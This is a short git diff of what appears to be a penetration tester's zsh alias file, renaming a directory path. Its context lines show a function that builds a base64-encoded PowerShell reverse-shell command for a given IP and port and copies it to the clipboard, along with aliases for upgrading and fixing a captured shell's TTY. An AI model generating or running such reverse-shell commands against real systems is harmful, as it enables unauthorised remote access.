@@ -52,7 +52,7 @@ gen_ps_rev () {
     then
       echo "[i] Usage: gen_ps_rev ip port"
     else
-      SHELL=`cat ~/jazz/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
+      SHELL=`cat ~/zsh-aliases/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
       echo "powershell -ec $SHELL" | xclip -sel clip
   fi
 }
@@ -69,4 +69,4 @@ alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip 
 alias tty_fix="stty raw -echo; fg; reset"
 alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
 
-export PATH=~/jazz/shells/:$PATH
+export PATH=~/zsh-aliases/shells/:$PATH
